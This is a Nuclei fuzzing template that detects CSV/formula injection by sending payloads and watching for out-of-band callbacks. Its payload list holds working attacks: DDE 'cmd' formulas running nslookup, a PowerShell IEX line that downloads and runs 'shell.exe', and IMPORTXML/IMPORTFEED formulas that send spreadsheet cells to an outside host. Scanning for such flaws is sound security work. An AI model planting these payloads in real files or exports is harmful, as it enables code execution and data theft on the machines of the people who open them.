http:
- fuzzing:
  - fuzz:
    - '{{csv_fuzz}}'
    mode: multiple
    part: request
    type: replace
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol, "http") || contains(interactsh_protocol, "dns")
    - contains(header, "csv") || contains(header, "excel") || contains(header, "spreadsheet")
    name: oob-interaction
    type: dsl
  payloads:
    csv_fuzz:
    - class.module.classLoader.resources.context.configFile=http://{{interactsh-url}}
    - DDE ("cmd";"/C nslookup{{interactsh-url}}";"!A0")A0
    - '@SUM(1+9)*cmd|'' /C nslookup{{interactsh-url}}''!A0'
    - =10+20+cmd|' /C nslookup{{interactsh-url}}'!A0
    - =cmd|' /C nslookup{{interactsh-url}}'!'A1'
    - =cmd|'/C powershell IEX(wget{{interactsh-url}}/shell.exe)'!A0
    - =IMPORTXML(CONCAT("http://{{interactsh-url}}", CONCATENATE(A2:E2)), "//a/a10")
    - =IMPORTFEED(CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)))
    - =IMPORTHTML (CONCAT("http://{{interactsh-url}}/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
    - =IMAGE("https://{{interactsh-url}}/images/srpr/logo3w.png")
  pre-condition:
  - dsl:
    - method != "OPTIONS"
    type: dsl
  stop-at-first-match: true
id: csv-injection
info:
  author: DhiyaneshDK,ritikchaddha
  description: 'A CSV injection detection template to identify and prevent CSV injection
    vulnerabilities by using various payloads that could be interpreted as formulas
    by spreadsheet applications.

    '
  name: CSV Injection Detection
  severity: medium
  tags: fuzzing-req-query,csv,dast,fuzzing-csv,fuzzing-req-csv
